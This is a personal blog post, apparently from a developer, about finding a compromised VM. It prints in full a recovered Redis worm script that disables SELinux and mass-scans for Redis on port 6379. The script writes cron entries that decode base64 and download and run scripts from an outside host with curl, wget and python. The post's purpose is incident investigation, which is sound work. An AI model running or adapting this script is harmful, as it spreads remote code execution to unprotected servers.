@@ -1,0 +1,353 @@
+<!DOCTYPE html>
+<html lang="en-us"><head><script src="/blog/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=blog/livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">A Journey into Unseen Threats on our VM | programmerraja blog</title>
+<meta property="og:title" content="A Journey into Unseen Threats on our VM | programmerraja blog" />
+<meta name="twitter:title" content="A Journey into Unseen Threats on our VM | programmerraja blog" />
+<meta itemprop="name" content="A Journey into Unseen Threats on our VM | programmerraja blog" />
+<meta name="application-name" content="A Journey into Unseen Threats on our VM | programmerraja blog" />
+<meta property="og:site_name" content="" />
+
+<meta name="description" content="">
+<meta itemprop="description" content="" />
+<meta property="og:description" content="" />
+<meta name="twitter:description" content="" />
+
+<meta property="og:locale" content="en-us" />
+<meta name="language" content="en-us" />
+
+  <link rel="alternate" hreflang="en" href="http://localhost:1313/blog/post/2024/a-journey-into-unseen-threats-on-our-vm/" title="" />
+
+
+
+  <meta itemprop="image" content="http://localhost:1313/blog/" />
+  <meta property="og:image" content="http://localhost:1313/blog/" />
+  <meta name="twitter:image" content="http://localhost:1313/blog/" />
+  <meta name="twitter:image:src" content="http://localhost:1313/blog/" />
+
+
+
+
+
+<meta name="generator" content="Hugo 0.125.7">
+
+    
+
+    <link rel="canonical" href="http://localhost:1313/blog/post/2024/a-journey-into-unseen-threats-on-our-vm/">
+    <link href="/blog/style.min.990327e048d1ffda356422f12681bcde50a59abea2012cf8e2855e248c7ca809.css" rel="stylesheet">
+    <link href="/blog/code-highlight.min.47ce138cfb8b509effd5f72a43ad97ac4b22d0d64f67b76dac5d84abbb77a414.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/blog/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/blog/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/blog/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/blog/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/blog/favicon.ico">
+
+
+
+
+<link rel="manifest" href="http://localhost:1313/blog/site.webmanifest">
+
+<meta name="msapplication-config" content="/blog/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/blog/icons/favicon.svg">
+
+    </head>
+<body data-theme = "" class="notransition">
+        <main class="main">
+
+<script src="/blog/js/theme.js"></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="http://localhost:1313/blog/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title></title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/blog/post/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/blog/notes/">
+                        Notes
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/blog/search/">
+                        Search
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/blog/tags/">
+                        Tags
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    
+                </li>
+            </ul>
+            <a id="mode" href="#">
+                
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">A Journey into Unseen Threats on our VM</h1>
+                
+                
+                <div class="post-meta">
+                    <time datetime="2024-05-04T19:51:57&#43;05:30" itemprop="datePublished"> May 4, 2024 </time>
+                </div>
+                
+            </header><div class="page-content">
+                <p>As the sun set on a typical Saturday evening, I found myself engrossed in a blog titled &ldquo;<a href="https://romeov.github.io/malicious_ip_addresses/malicious_ip_analysis.html">Visualizing Malicious IP Addresses.</a>&rdquo; The author shared clever ways to detect unauthorized attempts to access virtual machines via SSH, using commands like:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ journalctl --since <span class="s2">&#34;-1d&#34;</span> -u sshd <span class="p">|</span> grep <span class="s2">&#34;Failed password&#34;</span> <span class="p">|</span> wc -l
+</span></span><span class="line"><span class="cl">$ journalctl --since <span class="s2">&#34;-1d&#34;</span> -u sshd <span class="p">|</span> grep <span class="s2">&#34;Failed publickey&#34;</span> <span class="p">|</span> wc -l
+</span></span></code></pre></div><p>Curious, I decided to try these commands on our own VM. To my relief, the output was zero—no unauthorized login attempts. But my curiosity was piqued. I delved deeper into journalctl, discovering a command to display all Systemd logs with process IDs:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">journalctl -f -o verbose
+</span></span></code></pre></div><p>Upon executing the query on our VM, I encountered an intriguing error that immediately captured my attention.</p>
+<pre tabindex="0"><code> MESSAGE=/etc/.httpd/.../httpd: line 43: pnscan: command not found
+</code></pre><p>&ldquo;Pnscan?&rdquo; I muttered to myself, furrowing my brows. A quick Google search revealed that &ldquo;pnscan&rdquo; is a tool for scanning network ports—a tool we certainly hadn&rsquo;t authorized on our VM.</p>
+<p>Determined to unravel this mystery, I extracted the process ID from the journalctl logs and ventured into the depths of the <code>/proc</code> directory. Inside the PID folder, I hoped to glean more insights into this rogue process.</p>
+<p>My first stop was the <code>cmdline</code> file, where I discovered the command that initiated the process</p>
+<pre tabindex="0"><code> `/bin/bash/etc/.httpd/.../httpd`
+</code></pre><p>It seemed innocuous enough—a command to run the Apache server. But something didn&rsquo;t add up. Next, I turned my attention to the <code>fd</code> folder, hoping to find clues in the standard output and standard error streams. To my surprise, there was nothing there—except for a mysterious file named <code>255</code>.</p>
+<p>I cat the content of of the file and i got the below content</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>setenforce <span class="m">0</span> 2&gt;/dev/null
+</span></span><span class="line"><span class="cl"><span class="nb">ulimit</span> -u <span class="m">50000</span>
+</span></span><span class="line"><span class="cl">sleep <span class="m">1</span>
+</span></span><span class="line"><span class="cl">iptables -I INPUT <span class="m">1</span> -p tcp --dport <span class="m">6379</span> -j DROP 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">iptables -I INPUT <span class="m">1</span> -p tcp --dport <span class="m">6379</span> -s 127.0.0.1 -j ACCEPT 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">sleep <span class="m">1</span>
+</span></span><span class="line"><span class="cl">      
+</span></span><span class="line"><span class="cl">rm -rf .dat .shard .ranges .lan 2&gt;/dev/null
+</span></span><span class="line"><span class="cl">sleep <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;config set dbfilename &#34;backup.db&#34;&#39;</span> &gt; .dat
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;save&#39;</span> &gt;&gt; .dat
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;flushall&#39;</span> &gt;&gt; .dat
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;config set dir &#34;/var/spool/cron/&#34;&#39;</span> &gt;&gt; .dat
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;config set dbfilename &#34;root&#34;&#39;</span> &gt;&gt; .dat
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;set backup1 &#34;\n\n\n*/2 * * * * echo Y2QxIGh0dHA6Ly9zLm5hLWNzLmNvbS9iMmY2MjgvYi5zaAo=|base64 -d|bash|bash \n\n&#34;&#39;</span> &gt;&gt; .dat
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;set backup2 &#34;\n\n\n*/3 * * * * echo d2dldCAtcSAtTy0gaHR0cDovL3MubmEtY3MuY29tL2IyZjYyOC9iLnNoCg==|base64 -d|bash|bash\n\n&#34;&#39;</span> &gt;&gt; .dat
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;set backup3 &#34;\n\n\n*/4 * * * * echo Y3VybCBodHRwOi8vcy5uYS1jcy5jb20vYjJmNjI4L2Iuc2gK|base64 -d|bash|bash\n\n&#34;&#39;</span> &gt;&gt; .dat
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> c2V0IGJhY2t1cDQgIlxuXG5cbkBob3VybHkgIHB5dGhvbiAtYyBcImltcG9ydCB1cmxsaWIyOyBwcmludCB1cmxsaWIyLnVybG9wZW4oXCdodHRwOi8vXFxcXHMublxcYS1jXFxzLmNcXG9cbS90LnNoXCcpLnJlYWQoKVwiID4uMTtjaG1vZCAreCAuMTsuLy4xXG5cbiIK<span class="p">|</span>base64 -d &gt;&gt;.dat
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;save&#39;</span> &gt;&gt; .dat
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;config set dir &#34;/tmp&#34;&#39;</span> &gt;&gt; .dat
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;flushall&#39;</span> &gt;&gt; .dat
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;config set dir &#34;/var/spool/cron/crontabs&#34;&#39;</span> &gt;&gt; .dat
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;save&#39;</span> &gt;&gt; .dat
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;set backup1 &#34;\n\n\n*/2 * * * * root echo Y2QxIGh0dHA6Ly9zLm5hLWNzLmNvbS9iMmY2MjgvYi5zaAo=|base64 -d|bash|bash \n\n&#34;&#39;</span> &gt;&gt; .dat
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;set backup2 &#34;\n\n\n*/3 * * * * root echo d2dldCAtcSAtTy0gaHR0cDovL3MubmEtY3MuY29tL2IyZjYyOC9iLnNoCg==|base64 -d|bash|bash\n\n&#34;&#39;</span> &gt;&gt; .dat
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;set backup3 &#34;\n\n\n*/4 * * * * root echo Y3VybCBodHRwOi8vcy5uYS1jcy5jb20vYjJmNjI4L2Iuc2gK|base64 -d|bash|bash\n\n&#34;&#39;</span> &gt;&gt; .dat
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> c2V0IGJhY2t1cDQgIlxuXG5cbkBob3VybHkgIHB5dGhvbiAtYyBcImltcG9ydCB1cmxsaWIyOyBwcmludCB1cmxsaWIyLnVybG9wZW4oXCdodHRwOi8vXFxcXHMublxcYS1jXFxzLmNcXG9cbS90LnNoXCcpLnJlYWQoKVwiID4uMTtjaG1vZCAreCAuMTsuLy4xXG5cbiIK<span class="p">|</span>base64 -d &gt;&gt;.dat
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;config set dir &#34;/etc/cron.d/&#34;&#39;</span> &gt;&gt; .dat
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;config set dbfilename &#34;zzh&#34;&#39;</span> &gt;&gt; .dat
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;save&#39;</span> &gt;&gt; .dat
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;config set dir &#34;/etc/&#34;&#39;</span> &gt;&gt; .dat
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;config set dbfilename &#34;crontab&#34;&#39;</span> &gt;&gt; .dat
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;save&#39;</span> &gt;&gt; .dat
+</span></span><span class="line"><span class="cl">sleep <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="nv">pnx</span><span class="o">=</span>pnscan
+</span></span><span class="line"><span class="cl"><span class="o">[</span> -x /usr/local/bin/pnscan <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nv">pnx</span><span class="o">=</span>/usr/local/bin/pnscan
+</span></span><span class="line"><span class="cl"><span class="o">[</span> -x /usr/bin/pnscan <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nv">pnx</span><span class="o">=</span>/usr/bin/pnscan
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="nb">true</span>
+</span></span><span class="line"><span class="cl"><span class="k">do</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> x in <span class="k">$(</span> <span class="nb">echo</span> -e <span class="s2">&#34;47\n39\n8\n121\n106\n120\n123\n65\n3\n101\n139\n99\n63\n81\n44\n18\n119\n100\n42\n49\n118\n54\n1\n50\n114\n182\n52\n13\n34\n112\n115\n111\n116\n16\n35\n117\n124\n59\n36\n103\n82\n175\n122\n129\n45\n152\n159\n113\n15\n61\n180\n172\n157\n60\n218\n176\n58\n204\n140\n184\n150\n193\n223\n192\n75\n46\n188\n183\n222\n14\n104\n27\n221\n211\n132\n107\n43\n212\n148\n110\n62\n202\n95\n220\n154\n23\n149\n125\n210\n203\n185\n171\n146\n109\n94\n219\n134&#34;</span> <span class="p">|</span> sort -R <span class="k">)</span><span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> y in <span class="k">$(</span> seq <span class="m">0</span> <span class="m">255</span> <span class="p">|</span> sort -R <span class="k">)</span><span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$pnx</span> -t512 -R <span class="s1">&#39;6f 73 3a 4c 69 6e 75 78&#39;</span> -W <span class="s1">&#39;2a 31 0d 0a 24 34 0d 0a 69 6e 66 6f 0d 0a&#39;</span> <span class="nv">$x</span>.<span class="nv">$y</span>.0.0/16 <span class="m">6379</span> &gt; .r.<span class="nv">$x</span>.<span class="nv">$y</span>.o
+</span></span><span class="line"><span class="cl">awk <span class="s1">&#39;/Linux/ {print $1, $3}&#39;</span> .r.<span class="nv">$x</span>.<span class="nv">$y</span>.o &gt; .r.<span class="nv">$x</span>.<span class="nv">$y</span>.l
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="nb">read</span> -r h p<span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">cat .dat <span class="p">|</span> redis-cli -h <span class="nv">$h</span> -p <span class="nv">$p</span> --raw <span class="p">&amp;</span>
+</span></span><span class="line"><span class="cl"><span class="k">done</span> &lt; .r.<span class="nv">$x</span>.<span class="nv">$y</span>.l
+</span></span><span class="line"><span class="cl"><span class="k">done</span>
+</span></span><span class="line"><span class="cl"><span class="k">done</span>
+</span></span><span class="line"><span class="cl"><span class="k">done</span>
+</span></span><span class="line"><span class="cl">sleep <span class="m">1</span>
+</span></span><span class="line"><span class="cl">masscan --max-rate <span class="m">10000</span> -p6379 --shard <span class="k">$(</span> seq <span class="m">1</span> <span class="m">22000</span> <span class="p">|</span> sort -R <span class="p">|</span> head -n1 <span class="k">)</span>/22000 --exclude 255.255.255.255 0.0.0.0/0 2&gt;/dev/null <span class="p">|</span> awk <span class="s1">&#39;{print $6, substr($4, 1, length($4)-4)}&#39;</span> <span class="p">|</span> sort <span class="p">|</span> uniq &gt; .shard
+</span></span><span class="line"><span class="cl">sleep <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="nb">read</span> -r h p<span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">cat .dat <span class="p">|</span> redis-cli -h <span class="nv">$h</span> -p <span class="nv">$p</span> --raw 2&gt;/dev/null 1&gt;/dev/null <span class="p">&amp;</span>
+</span></span><span class="line"><span class="cl"><span class="k">done</span> &lt; .shard
+</span></span><span class="line"><span class="cl">sleep <span class="m">1</span>
+</span></span><span class="line"><span class="cl">masscan --max-rate <span class="m">10000</span> -p6379 192.168.0.0/16 172.16.0.0/16 116.62.0.0/16 116.232.0.0/16 116.128.0.0/16 116.163.0.0/16 2&gt;/dev/null <span class="p">|</span> awk <span class="s1">&#39;{print $6, substr($4, 1, length($4)-4)}&#39;</span> <span class="p">|</span> sort <span class="p">|</span> uniq &gt; .ranges
+</span></span><span class="line"><span class="cl">sleep <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="nb">read</span> -r h p<span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">cat .dat <span class="p">|</span> redis-cli -h <span class="nv">$h</span> -p <span class="nv">$p</span> --raw 2&gt;/dev/null 1&gt;/dev/null <span class="p">&amp;</span>
+</span></span><span class="line"><span class="cl"><span class="k">done</span> &lt; .ranges
+</span></span><span class="line"><span class="cl">sleep <span class="m">1</span>
+</span></span><span class="line"><span class="cl">ip a <span class="p">|</span> grep -oE <span class="s1">&#39;([0-9]{1,3}.?){4}/[0-9]{2}&#39;</span> 2&gt;/dev/null <span class="p">|</span> sed <span class="s1">&#39;s/\/\([0-9]\{2\}\)/\/16/g&#39;</span> &gt; .inet
+</span></span><span class="line"><span class="cl">sleep <span class="m">1</span>
+</span></span><span class="line"><span class="cl">masscan --max-rate <span class="m">10000</span> -p6379 -iL .inet <span class="p">|</span> awk <span class="s1">&#39;{print $6, substr($4, 1, length($4)-4)}&#39;</span> <span class="p">|</span> sort <span class="p">|</span> uniq &gt; .lan
+</span></span><span class="line"><span class="cl">sleep <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="nb">read</span> -r h p<span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">cat .dat <span class="p">|</span> redis-cli -h <span class="nv">$h</span> -p <span class="nv">$p</span> --raw 2&gt;/dev/null 1&gt;/dev/null <span class="p">&amp;</span>
+</span></span><span class="line"><span class="cl"><span class="k">done</span> &lt; .lan
+</span></span><span class="line"><span class="cl">sleep <span class="m">60</span>
+</span></span><span class="line"><span class="cl">rm -rf .dat .shard .ranges .lan 2&gt;/dev/null
+</span></span></code></pre></div><p>The script appears to conduct a Redis database backup, despite our VM not utilizing Redis. Of particular interest is the line:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">masscan --max-rate <span class="m">10000</span> -p6379 --shard <span class="k">$(</span> seq <span class="m">1</span> <span class="m">22000</span> <span class="p">|</span> sort -R <span class="p">|</span> head -n1 <span class="k">)</span>/22000 --exclude 255.255.255.255 0.0.0.0/0 2&gt;/dev/null <span class="p">|</span> awk <span class="s1">&#39;{print $6, substr($4, 1, length($4)-4)}&#39;</span> <span class="p">|</span> sort <span class="p">|</span> uniq &gt; .shard
+</span></span></code></pre></div><ol>
+<li>
+<p><strong>masscan</strong>: Performs a network scan.</p>
+<ul>
+<li><code>--max-rate 10000</code>: Limits packet sending to 10,000 per second.</li>
+<li><code>-p6379</code>: Targets port 6379, commonly associated with Redis.</li>
+<li><code>--shard $( seq 1 22000 | sort -R | head -n1 )/22000</code>: Divides the scan into shards, choosing a random shard from 1 to 22000.</li>
+<li><code>--exclude 255.255.255.255 0.0.0.0/0</code>: Excludes specific IP ranges from the scan.</li>
+<li><code>2&gt;/dev/null</code>: Suppresses error messages.</li>
+</ul>
+</li>
+<li>
+<p><strong><code>| awk '{print $6, substr($4, 1, length($4)-4)}'</code></strong>:</p>
+<ul>
+<li>Processes <code>masscan</code> output to extract status and IP/port information.</li>
+</ul>
+</li>
+<li>
+<p><strong><code>| sort | uniq &gt; .shard</code></strong>:</p>
+<ul>
+<li>Sorts and removes duplicates from the extracted data, saving it to a file named <code>.shard</code>.</li>
+</ul>
+</li>
+</ol>
+<p>In summary, the script attempts to scan and connect to Redis servers across different networks, possibly with intentions to execute commands outlined in the <code>.dat</code> file, which could be malicious. Furthermore, it tries to disable SELinux and adjust user limits, suggesting unauthorized access and system modification. This underscores the importance of vigilance in monitoring and securing systems against potential threats.</p>
+<p>the content of .dat file was</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">config <span class="nb">set</span> dbfilename <span class="s2">&#34;backup.db&#34;</span>
+</span></span><span class="line"><span class="cl">save
+</span></span><span class="line"><span class="cl">flushall
+</span></span><span class="line"><span class="cl">config <span class="nb">set</span> dir <span class="s2">&#34;/var/spool/cron/&#34;</span>
+</span></span><span class="line"><span class="cl">config <span class="nb">set</span> dbfilename <span class="s2">&#34;root&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> backup1 <span class="s2">&#34;\n\n\n*/2 * * * * echo Y2QxIGh0dHA6Ly9zLm5hLWNzLmNvbS9iMmY2MjgvYi5zaAo=|base64 -d|bash|bash \n\n&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> backup2 <span class="s2">&#34;\n\n\n*/3 * * * * echo d2dldCAtcSAtTy0gaHR0cDovL3MubmEtY3MuY29tL2IyZjYyOC9iLnNoCg==|base64 -d|bash|bash\n\n&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> backup3 <span class="s2">&#34;\n\n\n*/4 * * * * echo Y3VybCBodHRwOi8vcy5uYS1jcy5jb20vYjJmNjI4L2Iuc2gK|base64 -d|bash|bash\n\n&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> backup4 <span class="s2">&#34;\n\n\n@hourly  python -c \&#34;import urllib2; print urllib2.urlopen(\&#39;http://\\\\s.n\\a-c\\s.c\\o\m/t.sh\&#39;).read()\&#34; &gt;.1;chmod +x .1;./.1\n\n&#34;</span>
+</span></span><span class="line"><span class="cl">save
+</span></span><span class="line"><span class="cl">config <span class="nb">set</span> dir <span class="s2">&#34;/tmp&#34;</span>
+</span></span><span class="line"><span class="cl">flushall
+</span></span><span class="line"><span class="cl">config <span class="nb">set</span> dir <span class="s2">&#34;/var/spool/cron/crontabs&#34;</span>
+</span></span><span class="line"><span class="cl">save
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> backup1 <span class="s2">&#34;\n\n\n*/2 * * * * root echo Y2QxIGh0dHA6Ly9zLm5hLWNzLmNvbS9iMmY2MjgvYi5zaAo=|base64 -d|bash|bash \n\n&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> backup2 <span class="s2">&#34;\n\n\n*/3 * * * * root echo d2dldCAtcSAtTy0gaHR0cDovL3MubmEtY3MuY29tL2IyZjYyOC9iLnNoCg==|base64 -d|bash|bash\n\n&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> backup3 <span class="s2">&#34;\n\n\n*/4 * * * * root echo Y3VybCBodHRwOi8vcy5uYS1jcy5jb20vYjJmNjI4L2Iuc2gK|base64 -d|bash|bash\n\n&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> backup4 <span class="s2">&#34;\n\n\n@hourly  python -c \&#34;import urllib2; print urllib2.urlopen(\&#39;http://\\\\s.n\\a-c\\s.c\\o\m/t.sh\&#39;).read()\&#34; &gt;.1;chmod +x .1;./.1\n\n&#34;</span>
+</span></span><span class="line"><span class="cl">config <span class="nb">set</span> dir <span class="s2">&#34;/etc/cron.d/&#34;</span>
+</span></span><span class="line"><span class="cl">config <span class="nb">set</span> dbfilename <span class="s2">&#34;zzh&#34;</span>
+</span></span><span class="line"><span class="cl">save
+</span></span><span class="line"><span class="cl">config <span class="nb">set</span> dir <span class="s2">&#34;/etc/&#34;</span>
+</span></span><span class="line"><span class="cl">config <span class="nb">set</span> dbfilename <span class="s2">&#34;crontab&#34;</span>
+</span></span><span class="line"><span class="cl">save
+</span></span></code></pre></div><p>This script setup cron job to excute the script from remote url <code>http://s.na-cs.com/b2f628/b.sh</code>encoded in base64 format (<code>echo Y2QxIGh0dHA6Ly9zLm5hLWNzLmNvbS9iMmY2MjgvYi5zaAo=|base64</code>), I encountered an unexpected roadblock—the URL was inaccessible. Despite my efforts to uncover the script&rsquo;s intentions through the <code>/proc</code> file system, my investigation yielded no further insights.</p>
+<p>Ultimately, I made the decision to delete the compromised VM and initiate the creation of a new one, ensuring the integrity of our system&rsquo;s security.</p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/programmerraja" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+<a href="https://twitter.com/programmerraja" target="_blank" rel="noopener noreferrer me"
+    title="Twitter">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z">
+    </path>
+</svg>
+</a>
+<a href="https://www.linkedin.com/in/programmerraja/" target="_blank" rel="noopener noreferrer me"
+    title="Linkedin">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path>
+    <rect x="2" y="9" width="4" height="12"></rect>
+    <circle cx="4" cy="4" r="2"></circle>
+</svg>
+</a>
+<a href="index.xml" target="_blank" rel="noopener noreferrer me"
+    title="Rss">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M4 11a9 9 0 0 1 9 9" />
+    <path d="M4 4a16 16 0 0 1 16 16" />
+    <circle cx="5" cy="19" r="1" />
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2024 K.Boopathi.
+        
+    </small>
+</footer><a href="#" title="" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+
+
+    
+    <script async src="http://localhost:1313/blog/js/main.js" ></script>
+
+    
+
+</main>
+    </body>
+</html>
